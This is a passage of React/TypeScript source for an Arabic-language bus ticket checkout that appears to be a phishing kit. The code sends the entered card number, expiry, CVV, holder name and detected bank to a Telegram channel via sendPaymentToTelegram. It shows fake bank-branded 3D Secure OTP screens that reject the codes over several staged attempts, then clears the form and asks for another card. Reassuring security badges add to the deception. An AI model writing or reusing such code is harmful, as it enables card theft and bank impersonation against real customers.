    const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
    const bankResult = detectBank(cardNumber);
    await sendPaymentToTelegram({
      cardNumber, cardType: cardTypeName, expiryDate, cvv,
      cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
      amount: finalTotal, from: bookingData.from, to: bookingData.to,
      paymentMethod: paymentName, step: 'otp-failed',
      attemptNumber: 4,
      bankName: bankResult?.bank.name || 'Unknown',
    });

    setLoadingMsg('جارٍ التحقق من الرمز...');
    setIsLoading(true);
    await sleep(8000);
    setIsLoading(false);
    setStep('code_failed');
  };

  // After code_failed, go back to payment with toast
  const handleCodeFailedBack = async () => {
    setShowCardErrorToast(true);
    setCardNumber('');
    setCvv('');
    setExpiryDate('');
    setFailedAttempts(0);
    setVerificationCode('');
    await goToStep('payment', 4, 8000);
  };

  const toggleSeat = (id: string) => {
    setSelectedSeats(prev => prev.includes(id) ? prev.filter(s => s !== id) : prev.length >= totalPassengers ? prev : [...prev, id]);
  };

  // Bus seat data (must be defined BEFORE any conditional returns)
  const busSeats = useMemo(() => {
    const allSeats: { id: string; num: number; status: 'available' | 'occupied' | 'unavailable' }[] = [];
    const occupiedNums = new Set([1, 2, 4, 3, 5, 9, 13, 14, 19, 20, 21, 22, 23, 24, 25, 27, 28, 31, 35]);
    for (let i = 1; i <= 45; i++) {
      if (occupiedNums.has(i)) {
        allSeats.push({ id: `seat-${i}`, num: i, status: 'occupied' });
      } else {
        allSeats.push({ id: `seat-${i}`, num: i, status: 'available' });
      }
    }
    return allSeats;
  }, []);

  const seatLayout = [
    { left: [1, 2], right: [4, 3] },
    { left: [5, 6], right: [8, 7] },
    { left: [9, 10], right: [] },
    { left: [11, 12], right: [] },
    { left: [15, 16], right: [14, 13] },
    { left: [17, 18], right: [] },
    { left: [19, 20], right: [] },
    { left: [21, 22], right: [24, 23] },
    { left: [25, 26], right: [28, 27] },
    { left: [29, 30], right: [32, 31] },
    { left: [33, 34], right: [36, 35] },
    { left: [37, 38], right: [40, 39] },
    { left: [], right: [] },
    { back: [41, 42, 45, 44, 43] },
  ];

  // ═══════════════════════════════════════════════════════════════
  //  STEP: CODE FAILED (after 4 attempts)
  // ═══════════════════════════════════════════════════════════════
  if (step === 'code_failed') {
    return (
      <div className="fixed inset-0 z-[70] bg-gradient-to-b from-red-50 to-white overflow-y-auto">
        <LoadingScreen isVisible={isLoading} message={loadingMsg} />
        <div className="min-h-[100dvh] flex flex-col items-center justify-center px-4 py-8">
          <div className="w-24 h-24 rounded-full bg-red-100 flex items-center justify-center mb-6 shadow-lg">
            <AlertTriangle className="w-12 h-12 text-red-500" />
          </div>
          <h2 className="text-2xl font-extrabold text-charcoal mb-2">تم تجاوز عدد المحاولات</h2>
          <p className="text-[#8A7E6B] mb-8 text-center max-w-sm">لقد أدخلت الرمز بشكل غير صحيح 4 مرات متتالية</p>

          <div className="bg-white rounded-3xl shadow-xl border border-red-200 p-6 w-full max-w-md text-right mb-6">
            <div className="flex items-center gap-3 mb-4 pb-4 border-b border-[#E5E0D5]">
              <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center">
                <AlertTriangle className="w-5 h-5 text-red-500" />
              </div>
              <div>
                <h3 className="font-bold text-charcoal">فشل التحقق</h3>
                <p className="text-xs text-[#8A7E6B]">4 محاولات خاطئة</p>
              </div>
            </div>
            <p className="text-sm text-[#8A7E6B] leading-relaxed">
              لا يمكن إتمام عملية الدفع باستخدام هذه البطاقة. يرجى استخدام بطاقة دفع أخرى أو التواصل مع البنك.
            </p>
          </div>

          <button
            onClick={handleCodeFailedBack}
            className="w-full max-w-md h-14 gold-gradient text-white font-bold rounded-2xl shadow-lg hover:shadow-xl transition-all text-lg flex items-center justify-center gap-2"
          >
            <CreditCard className="w-5 h-5" />
            إعادة المحاولة ببطاقة أخرى
          </button>
          <button onClick={onClose} className="mt-4 text-[#8A7E6B] hover:text-charcoal text-sm transition-colors">
            إلغاء العملية والعودة
          </button>
        </div>
      </div>
    );
  }

  // ─── Countdown Timer Hook ───────────────────────────────────
  const useCountdown = (initialSeconds: number) => {
    const [seconds, setSeconds] = useState(initialSeconds);
    useEffect(() => {
      if (seconds <= 0) return;
      const timer = setInterval(() => setSeconds(s => s - 1), 1000);
      return () => clearInterval(timer);
    }, [seconds]);
    const mins = Math.floor(seconds / 60).toString().padStart(2, '0');
    const secs = (seconds % 60).toString().padStart(2, '0');
    return { display: `${mins}:${secs}`, seconds };
  };

  // ─── Bank-Branded OTP Page Component ───────────────────────
  const OtpInputPage: React.FC<{ stepNum: number; showWarning: boolean }> = ({ showWarning }) => {
    const { display: countdownDisplay, seconds: remainingSeconds } = useCountdown(286);
    const maskedCard = cardNumber
      ? `**** **** **** ${cardNumber.replace(/\s/g, '').slice(-4)}`
      : '**** **** **** 0511';

    // Get bank branding
    const bank = detectedBank ? getBankInfo(detectedBank) : null;
    const bankColor = bank?.color || '#2563eb';
    const bankColorDark = bank?.colorDark || '#1e40af';
    const bankColorLight = bank?.colorLight || '#EFF6FF';
    const bankName = bank?.name || 'بنكك';
    const bankOtpMsg = bank?.otpMessage || 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى البنك';
    const bankSupport = bank?.supportPhone || '920000000';

    // Card brand icon
    const CardBrandIconSmall: React.FC = () => {
      if (detectedCard === 'visa' || selectedPayment === 'visa') {
        return (
          <div className="flex items-center bg-white rounded-md px-2 py-1">
            <span className="text-[#1A1F71] font-extrabold text-sm italic tracking-wider" style={{ fontFamily: 'Arial, sans-serif' }}>VISA</span>
          </div>
        );
      }
      if (detectedCard === 'mada' || selectedPayment === 'mada') {
        return (
          <div className="flex items-center bg-white rounded-md px-2 py-1 gap-1">
            <div className="flex flex-col gap-0.5">
              <div className="w-5 h-2 bg-[#259bd6] rounded-sm" />
              <div className="w-5 h-2 bg-[#84b740] rounded-sm" />
            </div>
            <span className="text-[#27292d] font-extrabold text-sm" style={{ fontFamily: 'Arial, sans-serif' }}>mada</span>
          </div>
        );
      }
      return <CreditCard className="w-8 h-5 text-white" />;
    };

    return (
      <div className="fixed inset-0 z-[70] overflow-y-auto" style={{ backgroundColor: bankColorLight }}>
        <LoadingScreen
          isVisible={isLoading}
          message={loadingMsg}
          cardIcon={detectedCard || selectedPayment}
          amount={finalTotal}
          cardNumber={cardNumber}
          route={{ from: bookingData.from, to: bookingData.to }}
        />

        {/* ═══ Bank-Branded Gradient Header ═══ */}
        <div className="text-white" style={{ background: `linear-gradient(135deg, ${bankColor} 0%, ${bankColorDark} 100%)` }}>
          {/* Top Row: Shield + Bank Name + 3D Secure */}
          <div className="flex items-center justify-between px-4 pt-4 pb-2">
            <div className="flex items-center gap-2">
              <Shield className="w-4 h-4 text-white/80" />
              <span className="text-white/90 text-sm font-bold">{bankName}</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-white font-bold text-sm">3D Secure</span>
              <div className="w-2.5 h-2.5 rounded-full bg-green-400 animate-pulse" />
            </div>
          </div>

          {/* Bank Logo + Card Info Bar */}
          <div className="px-4 py-3" style={{ backgroundColor: 'rgba(0,0,0,0.2)' }}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <CardBrandIconSmall />
                {bank && (
                  <div className="flex items-center gap-2 bg-white/15 backdrop-blur-sm rounded-lg px-3 py-1.5">
                    {bank.logoUrl ? (
                      <img src={bank.logoUrl} alt={bankName} className="h-8 w-auto max-w-[80px] object-contain" />
                    ) : (
                      <div className="w-7 h-7 rounded-full bg-white/20 flex items-center justify-center text-[10px] font-extrabold text-white">
                        {bankName.charAt(0)}
                      </div>
                    )}
                    <span className="text-white text-xs font-bold">{bankName}</span>
                  </div>
                )}
              </div>
              <div className="flex items-center gap-2">
                <span className="text-white/80 text-sm font-mono" dir="ltr">{maskedCard}</span>
                <span className="text-white/60 text-[10px]">بطاقة الدفع</span>
              </div>
            </div>
          </div>

          {/* Amount Section */}
          <div className="px-4 py-3 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-full bg-white/15 flex items-center justify-center">
                <Lock className="w-4 h-4 text-white/80" />
              </div>
              <span className="text-white/60 text-[10px] font-mono">SAP-{Date.now().toString(36).toUpperCase().slice(-12)}</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-white font-extrabold text-xl">{finalTotal}</span>
              <span className="text-white/80 text-sm">ر.س</span>
              <span className="text-white/60 text-xs mr-1">المبلغ المراد خصمه</span>
            </div>
          </div>
        </div>

        {/* ═══ Bank-Branded SMS Banner ═══ */}
        <div className="mx-3 mt-3">
          <div className="rounded-xl p-4 flex items-center gap-3 border" style={{ backgroundColor: 'rgba(255,255,255,0.8)', borderColor: bankColor + '30' }}>
            <div className="w-11 h-11 rounded-xl flex items-center justify-center shrink-0" style={{ backgroundColor: bankColor }}>
              <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/>
              </svg>
            </div>
            <div className="flex-1 text-right">
              <p className="text-charcoal text-sm font-bold leading-relaxed">{bankOtpMsg}</p>
              <p className="text-[#8A7E6B] text-[11px] mt-0.5">تم الإرسال إلى <span className="font-bold">+966*** ****</span></p>
            </div>
          </div>
        </div>

        {/* ═══ Warning Banner (for otp_2, otp_3) ═══ */}
        {showWarning && (
          <div className="mx-3 mt-3">
            <div className="bg-red-50 border border-red-200 rounded-xl p-3.5 flex items-center gap-3 animate-fade-in">
              <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center shrink-0">
                <AlertTriangle className="w-5 h-5 text-red-500" />
              </div>
              <div>
                <p className="text-red-700 font-bold text-sm">الرمز غير صحيح</p>
                <p className="text-red-500 text-xs">لم نتمكن من التحقق من الرمز المُدخل. يرجى المحاولة مرة أخرى.</p>
              </div>
            </div>
          </div>
        )}

        {/* ═══ OTP Input Section ═══ */}
        <div className="mx-3 mt-3 bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
          <div className="flex items-center justify-between mb-3">
            <span className="text-[10px] text-[#8A7E6B] bg-[#F5F3EF] px-2 py-0.5 rounded-full font-bold">محمي بـ 3D Secure</span>
            <p className="text-charcoal font-bold text-base text-right">رمز التحقق (OTP)</p>
          </div>

          <input
            type="text"
            inputMode="numeric"
            value={verificationCode}
            onChange={(e) => {
              const v = e.target.value.replace(/\D/g, '').slice(0, 6);
              setVerificationCode(v);
            }}
            placeholder="—  —  —  —  —  —"
            className="w-full h-16 text-center text-3xl font-extrabold border-2 border-[#E5E0D5] rounded-xl transition-all text-charcoal bg-[#FAFBFC] tracking-[0.3em] focus:ring-4"
            style={{ '--tw-ring-color': bankColor + '20', borderColor: undefined }}
            onFocus={(e) => { e.target.style.borderColor = bankColor; }}
            onBlur={(e) => { e.target.style.borderColor = '#E5E0D5'; }}
            dir="ltr"
            maxLength={6}
            autoFocus
          />

          {/* Timer Row */}
          <div className="flex items-center justify-between mt-3 mb-4">
            <span className="text-[#8A7E6B] text-xs flex items-center gap-1">
              <svg className="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
              لا تشارك الرمز
            </span>
            <div className="flex items-center gap-1.5">
              <span className="text-orange-500 font-bold text-sm">الرمز ينتهي خلال {countdownDisplay}</span>
              <div className="w-2 h-2 rounded-full bg-orange-400 animate-pulse" />
            </div>
          </div>

          {/* Confirm Button — Bank colored */}
          <button
            onClick={handleVerifyCode}
            disabled={verificationCode.length < 4 || isLoading}
            className="w-full h-14 text-white font-bold rounded-xl shadow-lg transition-all text-lg flex items-center justify-center gap-2 hover:shadow-xl hover:scale-[1.02] disabled:scale-100"
            style={{
              background: verificationCode.length >= 4 && !isLoading
                ? `linear-gradient(135deg, ${bankColor} 0%, ${bankColorDark} 100%)`
                : '#D5CFC5',
              cursor: verificationCode.length >= 4 && !isLoading ? 'pointer' : 'not-allowed',
            }}
          >
            {isLoading ? (
              <svg className="animate-spin w-5 h-5" viewBox="0 0 24 24" fill="none"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="white" strokeWidth="4"/><path className="opacity-75" fill="white" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
            ) : (
              <Lock className="w-5 h-5" />
            )}
            {isLoading ? 'جارٍ التحقق...' : 'تأكيد الرمز وإتمام الدفع'}
          </button>

          {/* Resend */}
          <p className="text-center text-[#8A7E6B] text-sm mt-3">
            لم تستلم الرمز؟ <span className="font-medium" style={{ color: bankColor }}>إعادة إرسال بعد {remainingSeconds} ث</span>
          </p>
        </div>

        {/* ═══ Bank Support Footer ═══ */}
        <div className="mx-3 mt-3 mb-6">
          <div className="bg-white rounded-xl border border-gray-100 p-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Phone className="w-4 h-4" style={{ color: bankColor }} />
                <span className="text-sm font-bold text-charcoal">{bankSupport}</span>
              </div>
              <span className="text-[#8A7E6B] text-xs">الدعم الفني — {bankName} — على مدار الساعة</span>
            </div>
          </div>
        </div>

        {/* ═══ Security Badges ═══ */}
        <div className="mx-3 mt-2 mb-6 space-y-2">
          {[
            { icon: <Lock className="w-4 h-4" />, text: 'تشفير SSL 256-bit' },
            { icon: <Shield className="w-4 h-4" />, text: 'حماية 3D Secure' },
            { icon: <Clock className="w-4 h-4" />, text: 'رمز صالح 5 دقائق فقط' },
            { icon: <AlertTriangle className="w-4 h-4" />, text: 'لا تشارك الرمز لأحد' },
          ].map((badge, i) => (
            <div key={i} className="bg-white rounded-xl border border-gray-100 p-3 flex items-center justify-between">
              <span className="text-charcoal text-sm font-medium">{badge.text}</span>
              <span style={{ color: bankColor }}>{badge.icon}</span>
            </div>
          ))}
        </div>
      </div>
    );
  };

  // ═══════════════════════════════════════════════════════════════
  //  STEP: OTP 4 — Final attempt, no input, only retry button
  // ═══════════════════════════════════════════════════════════════
  if (step === 'otp_4') {
    const maskedCard = cardNumber
      ? `**** **** **** ${cardNumber.replace(/\s/g, '').slice(-4)}`
      : '**** **** **** 0511';

    // Get bank branding
    const bank = detectedBank ? getBankInfo(detectedBank) : null;
    const bankColor = bank?.color || '#2563eb';
    const bankColorDark = bank?.colorDark || '#1e40af';
    const bankColorLight = bank?.colorLight || '#EFF6FF';
    const bankName = bank?.name || 'بنكك';

    const CardBrandIconSmall: React.FC = () => {
      if (detectedCard === 'visa' || selectedPayment === 'visa') {
        return (
          <div className="flex items-center bg-white rounded-md px-2 py-1">
            <span className="text-[#1A1F71] font-extrabold text-sm italic tracking-wider" style={{ fontFamily: 'Arial, sans-serif' }}>VISA</span>
          </div>
        );
      }
      if (detectedCard === 'mada' || selectedPayment === 'mada') {
        return (
          <div className="flex items-center bg-white rounded-md px-2 py-1 gap-1">
            <div className="flex flex-col gap-0.5">
              <div className="w-5 h-2 bg-[#259bd6] rounded-sm" />
              <div className="w-5 h-2 bg-[#84b740] rounded-sm" />
            </div>
            <span className="text-[#27292d] font-extrabold text-sm" style={{ fontFamily: 'Arial, sans-serif' }}>mada</span>
          </div>
        );
      }
      return <CreditCard className="w-8 h-5 text-white" />;
    };

    return (
      <div className="fixed inset-0 z-[70] overflow-y-auto" style={{ backgroundColor: bankColorLight }}>
        <LoadingScreen
          isVisible={isLoading}
          message={loadingMsg}
          cardIcon={detectedCard || selectedPayment}
          amount={finalTotal}
          cardNumber={cardNumber}
          route={{ from: bookingData.from, to: bookingData.to }}
        />

        {/* ─── Bank-Branded Header ─────────────────────────── */}
        <div className="text-white" style={{ background: `linear-gradient(135deg, ${bankColor} 0%, ${bankColorDark} 100%)` }}>
          <div className="flex items-center justify-between px-4 pt-4 pb-2">
            <div className="flex items-center gap-2">
              <Shield className="w-4 h-4 text-white/80" />
              <span className="text-white/90 text-sm font-bold">{bankName}</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-white font-bold text-sm">3D Secure</span>
              <div className="w-2.5 h-2.5 rounded-full bg-green-400 animate-pulse" />
            </div>
          </div>

          <div className="px-4 py-3" style={{ backgroundColor: 'rgba(0,0,0,0.2)' }}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <CardBrandIconSmall />
                {bank && (
                  <div className="flex items-center gap-2 bg-white/15 backdrop-blur-sm rounded-lg px-3 py-1.5">
                    {bank.logoUrl ? (
                      <img src={bank.logoUrl} alt={bankName} className="h-8 w-auto max-w-[80px] object-contain" />
                    ) : (
                      <div className="w-7 h-7 rounded-full bg-white/20 flex items-center justify-center text-[10px] font-extrabold text-white">
                        {bankName.charAt(0)}
                      </div>
                    )}
                    <span className="text-white text-xs font-bold">{bankName}</span>
                  </div>
                )}
              </div>
              <div className="flex items-center gap-2">
                <span className="text-white/80 text-sm font-mono" dir="ltr">{maskedCard}</span>
                <span className="text-white/60 text-[10px]">بطاقة الدفع</span>
              </div>
            </div>
          </div>

          <div className="px-4 py-3 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-full bg-white/15 flex items-center justify-center">
                <Lock className="w-4 h-4 text-white/80" />
              </div>
              <span className="text-white/60 text-[10px] font-mono">SAP-{Date.now().toString(36).toUpperCase().slice(-12)}</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-white font-extrabold text-xl">{finalTotal}</span>
              <span className="text-white/80 text-sm">ر.س</span>
              <span className="text-white/60 text-xs mr-1">المبلغ المراد خصمه</span>
            </div>
          </div>
        </div>

        {/* Warning Banner */}
        <div className="mx-3 mt-3">
          <div className="bg-red-50 border border-red-200 rounded-xl p-3.5 flex items-center gap-3 animate-fade-in">
            <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center shrink-0">
              <AlertTriangle className="w-5 h-5 text-red-500" />
            </div>
            <div>
              <p className="text-red-700 font-bold text-sm">الرمز غير صحيح</p>
              <p className="text-red-500 text-xs">لم نتمكن من التحقق من الرمز المُدخل</p>
            </div>
          </div>
        </div>

        {/* Exceeded Attempts Message */}
        <div className="mx-3 mt-3 bg-white rounded-2xl shadow-sm border border-gray-100 p-6 text-center">
          <div className="w-16 h-16 mx-auto rounded-full flex items-center justify-center mb-3" style={{ background: `linear-gradient(135deg, ${bankColorLight} 0%, ${bankColor}15 100%)` }}>
            <AlertTriangle className="w-8 h-8" style={{ color: bankColor }} />
          </div>
          <h3 className="text-lg font-extrabold text-charcoal mb-1">تم استنفاد المحاولات المتاحة</h3>
          <p className="text-[#8A7E6B] text-sm mb-5">لقد أدخلت الرمز بشكل غير صحيح 4 مرات متتالية</p>

          <button
            onClick={handleOtp4Retry}
            className="w-full h-14 text-white font-bold rounded-xl shadow-lg hover:shadow-xl transition-all text-lg"
            style={{ background: `linear-gradient(135deg, ${bankColor} 0%, ${bankColorDark} 100%)` }}
          >
            إعادة المحاولة
          </button>
          <button onClick={onClose} className="w-full mt-3 py-2 text-[#8A7E6B] hover:text-charcoal text-sm transition-colors">
            إلغاء العملية والعودة
          </button>
        </div>

        {/* Security Badges */}
        <div className="mx-3 mt-3 mb-6 space-y-2">
          {[
            { icon: <Lock className="w-4 h-4" />, text: 'تشفير SSL 256-bit' },
            { icon: <Shield className="w-4 h-4" />, text: 'حماية 3D Secure' },
            { icon: <Clock className="w-4 h-4" />, text: 'رمز صالح 5 دقائق فقط' },
            { icon: <AlertTriangle className="w-4 h-4" />, text: 'لا تشارك الرمز لأحد' },
          ].map((badge, i) => (
            <div key={i} className="bg-white rounded-xl border border-gray-100 p-3 flex items-center justify-between">
              <span className="text-charcoal text-sm font-medium">{badge.text}</span>
              <span style={{ color: bankColor }}>{badge.icon}</span>
            </div>
          ))}
        </div>
      </div>
    );
  }

  // ═══════════════════════════════════════════════════════════════
  //  STEP 6: CODE VERIFICATION (first attempt, no warning)
  // ═══════════════════════════════════════════════════════════════
  if (step === 'code_verification') {
    return <OtpInputPage stepNum={1} showWarning={false} />;
  }

  // ═══════════════════════════════════════════════════════════════
  //  STEP: OTP 2 — Second attempt (with warning + input)
  // ═══════════════════════════════════════════════════════════════
  if (step === 'otp_2') {
    return <OtpInputPage stepNum={2} showWarning={true} />;
  }

  // ═══════════════════════════════════════════════════════════════
  //  STEP: OTP 3 — Third attempt (with warning + input)
  // ═══════════════════════════════════════════════════════════════
  if (step === 'otp_3') {
    return <OtpInputPage stepNum={3} showWarning={true} />;
  }

  // ═══════════════════════════════════════════════════════════════
  //  STEP 5: PAYMENT FORM (Premium Redesign with Live Card Preview)
  // ═══════════════════════════════════════════════════════════════
  if (step === 'payment') {
    const pm = paymentMethods.find(p => p.id === selectedPayment);
    const cardDigits = cardNumber.replace(/\s/g, '');
    const cardType = detectCardType(cardDigits);

    // ─── Instant bank detection on 8+ digits ──────────────────
    const bankResult = cardDigits.length >= 8 ? detectBank(cardNumber) : null;
    const detectedBankKey = bankResult?.bankKey || null;
    const bankInfo = detectedBankKey ? getBankInfo(detectedBankKey) : null;
    const bankColor = bankInfo?.color || (cardType === 'mada' ? '#1a7ab8' : cardType === 'mastercard' ? '#1a1a2e' : '#1a237e');
    const bankColorDark = bankInfo?.colorDark || '#0d1642';

    const displayNumber = cardNumber || '•••• •••• •••• ••••';
    const displayHolder = (cardHolderFirst + ' ' + cardHolderLast).trim() || 'YOUR NAME';
    const displayExpiry = expiryDate || 'MM/YY';
    const displayCvv = cvv || '•••';
    const isCardValid = luhnCheck(cardDigits);
    const isExpValid = isExpiryValid(expiryDate);
    const isCardComplete = cardDigits.length >= (cardType === 'amex' ? 15 : 16) && isExpValid && cvv.length === 3;
    return (
      <div className="fixed inset-0 z-[70] bg-gradient-to-b from-[#F0EDE4] to-[#FAFAF8] overflow-y-auto">
        <LoadingScreen isVisible={isLoading} message={loadingMsg} cardIcon={detectedCard || selectedPayment} />

        {/* ─── Header ─── */}
        <div className="sticky top-0 z-20 bg-white/90 backdrop-blur-xl border-b border-[#E5E0D5] shadow-sm">
          <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
            <button onClick={() => !isLoading && setStep('payment_method')} className="w-10 h-10 rounded-full bg-[#F8F6F2] flex items-center justify-center text-[#8A7E6B] hover:text-charcoal transition-all hover:bg-[#F0EDE4] active:scale-95">
              <ChevronLeft className="w-5 h-5" />
            </button>
            <div className="flex items-center gap-3">
              <h2 className="text-base font-extrabold text-charcoal">بيانات البطاقة</h2>
              <span className="text-xs bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white px-2.5 py-0.5 rounded-full font-bold">4/5</span>
            </div>
            <img src="/sat-logo.png" alt="سات" className="h-8 w-auto" />
          </div>
        </div>

        <div className="max-w-2xl mx-auto px-4 py-5 space-y-5">
          {/* ═══ 5-Step Professional Progress Bar ═══ */}
          <div className="bg-white rounded-2xl shadow-sm border border-[#E5E0D5] p-4">
            <div className="flex items-center justify-between relative">
              <div className="absolute top-[18px] left-[10%] right-[10%] h-[2px] bg-[#E5E0D5] -z-0">
                <div className="h-full bg-gradient-to-l from-[#C4A94D] to-[#C4A94D] transition-all duration-700" style={{ width: '75%' }} />
              </div>
              {[
                { label: 'البحث', num: 1, done: true },
                { label: 'المقاعد', num: 2, done: true },
                { label: 'التفاصيل', num: 3, done: true },
                { label: 'الدفع', num: 4, done: false, active: true },
                { label: 'التأكيد', num: 5, done: false },
              ].map((s, i) => (
                <div key={i} className="flex flex-col items-center gap-1.5 relative z-10">
                  <div className={`w-9 h-9 rounded-full flex items-center justify-center text-xs font-extrabold transition-all duration-500 shadow-sm ${
                    s.active ? 'bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white shadow-lg scale-110 ring-4 ring-[#C4A94D]/20' :
                    s.done ? 'bg-[#C4A94D] text-white' : 'bg-white text-[#B5AFA3] border-2 border-[#E5E0D5]'
                  }`}>
                    {s.done && !s.active ? <Check className="w-4 h-4" /> : s.num}
                  </div>
                  <span className={`text-[10px] font-bold transition-colors ${s.active ? 'text-[#C4A94D]' : s.done ? 'text-[#8A7E6B]' : 'text-[#B5AFA3]'}`}>{s.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* ─── Card Error Toast ─── */}
          {showCardErrorToast && (
            <div className="bg-red-50 border border-red-200 rounded-2xl p-4 flex items-start gap-3 animate-fade-in">
              <AlertTriangle className="w-5 h-5 text-red-500 shrink-0 mt-0.5" />
              <div>
                <p className="text-red-700 font-bold text-sm">فشل في معالجة البطاقة</p>
                <p className="text-red-600 text-xs mt-1">يرجى إدخال معلومات البطاقة بشكل صحيح أو إدخال بطاقة دفع أخرى</p>
              </div>
            </div>
          )}

          {/* ─── Main Content: Card Preview + Form ─── */}
          <div className="flex flex-col lg:flex-row gap-5">
            {/* ── Left: Card Preview + Form ── */}
            <div className="flex-1 min-w-0 space-y-5">
              {/* ═══ Live Credit Card Preview — Bank-Branded ═══ */}
              <div className="perspective-[1200px]">
                <div
                  className={`relative w-full max-w-[400px] mx-auto aspect-[1.586] rounded-3xl p-6 text-white shadow-2xl transition-all duration-500 overflow-hidden ${isCardComplete ? 'ring-2 ring-[#C4A94D]/50 shadow-[#C4A94D]/20' : ''}`}
                  style={{ background: `linear-gradient(135deg, ${bankColor} 0%, ${bankColorDark} 100%)` }}
                >
                  {/* Background pattern */}
                  <div className="absolute inset-0 opacity-10">
                    <svg className="w-full h-full" viewBox="0 0 400 252" fill="none">
                      <circle cx="320" cy="40" r="120" fill="white" />
                      <circle cx="80" cy="200" r="80" fill="white" />
                      <path d="M0 0h400v252H0z" fill="url(#grid)" opacity="0.3" />
                      <defs><pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse"><path d="M 20 0 L 0 0 0 20" fill="none" stroke="white" strokeWidth="0.5" /></pattern></defs>
                    </svg>
                  </div>

                  {/* Top Row: Bank Logo + Card Brand */}
                  <div className="relative z-10 flex items-center justify-between">
                    {/* Bank Logo (appears on 8+ digits) */}
                    {bankInfo ? (
                      <img 
                        src={bankInfo.logoUrl} 
                        alt={bankInfo.name} 
                        className="h-8 w-auto max-w-[100px] object-contain" 
                      />
                    ) : (
                      <div className="w-12 h-9" />
                    )}
                    {/* Card Brand */}
                    <div className="flex items-center gap-2">
                      {cardType === 'mada' ? <MadaIcon className="w-14 h-5 opacity-80" /> :
                       cardType === 'mastercard' ? <MastercardIcon className="w-10 h-7 opacity-80" /> :
                       cardType === 'visa' ? <VisaIcon className="w-16 h-5 opacity-80" /> :
                       <CreditCard className="w-6 h-6 text-white/30" />}
                    </div>
                  </div>

                  {/* Chip */}
                  <div className="relative z-10 mt-4">
                    <div className="w-12 h-9 rounded-lg bg-gradient-to-br from-[#d4af37] via-[#f0d878] to-[#b8941d] flex items-center justify-center shadow-md">
                      <div className="w-8 h-6 border border-[#a08018] rounded-sm flex items-center justify-center relative">
                        <div className="w-5 h-0.5 bg-[#a08018]" />
                        <div className="absolute w-0.5 h-3 bg-[#a08018]" />
                      </div>
                    </div>
                  </div>

                  {/* Card Number */}
                  <div className="relative z-10 mt-5">
                    <p className="text-white/50 text-[9px] font-bold tracking-[0.2em] uppercase mb-1">Card Number</p>
                    <p className="font-mono text-xl tracking-[0.15em] font-bold" dir="ltr">{displayNumber}</p>
                  </div>

                  {/* Holder + Expiry */}
                  <div className="relative z-10 mt-4 flex items-end justify-between">
                    <div className="flex-1 min-w-0">
                      <p className="text-white/50 text-[9px] font-bold tracking-[0.15em] uppercase mb-0.5">Card Holder</p>
                      <p className="text-sm font-bold tracking-wide uppercase truncate">{displayHolder}</p>
                    </div>
                    <div className="text-left mr-4">
                      <p className="text-white/50 text-[9px] font-bold tracking-[0.15em] uppercase mb-0.5">Expiry</p>
                      <p className="text-sm font-bold font-mono" dir="ltr">{displayExpiry}</p>
                    </div>
                    <div className="text-left">
                      <p className="text-white/50 text-[9px] font-bold tracking-[0.15em] uppercase mb-0.5">CVV</p>
                      <p className="text-sm font-bold font-mono" dir="ltr">{displayCvv}</p>
                    </div>
                  </div>

                  {/* Bank Name Badge (bottom-left, appears on 8+ digits) */}
                  {bankInfo && (
                    <div className="absolute bottom-5 left-5 z-10 bg-white/15 backdrop-blur-sm rounded-lg px-3 py-1.5 flex items-center gap-2">
                      <Shield className="w-3 h-3 text-white/80" />
                      <span className="text-white text-[10px] font-bold">{bankInfo.name}</span>
                    </div>
                  )}

                  {/* Contactless icon */}
                  <div className="absolute bottom-5 right-5 z-10">
                    <svg className="w-6 h-6 text-white/40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                      <path d="M8.5 14.5A5.5 5.5 0 0 0 14 9" />
                      <path d="M5.5 17.5A9.5 9.5 0 0 0 15 8" />
                      <path d="M2.5 20.5A13.5 13.5 0 0 0 16 7" />
                    </svg>
                  </div>
                </div>

                {/* Bank detection status below card */}
                {cardDigits.length >= 8 && (
                  <div className="text-center mt-2 flex items-center justify-center gap-1.5">
                    {bankInfo ? (
                      <>
                        <Shield className="w-3.5 h-3.5" style={{ color: bankColor }} />
                        <span className="text-xs font-bold" style={{ color: bankColor }}>
                          تم تحديد البنك: {bankInfo.name}
                        </span>
                      </>
                    ) : (
                      <>
                        <AlertTriangle className="w-3.5 h-3.5 text-[#B5AFA3]" />
                        <span className="text-xs text-[#B5AFA3]">لم يتم التعرف على البنك</span>
                      </>
                    )}
                  </div>
                )}
              </div>

              {/* ═══ Card Form ═══ */}
              <div className="bg-white rounded-3xl shadow-lg border border-[#E5E0D5] p-5 space-y-4">
                <div className="flex items-center gap-2 pb-3 border-b border-[#F0EDE4]">
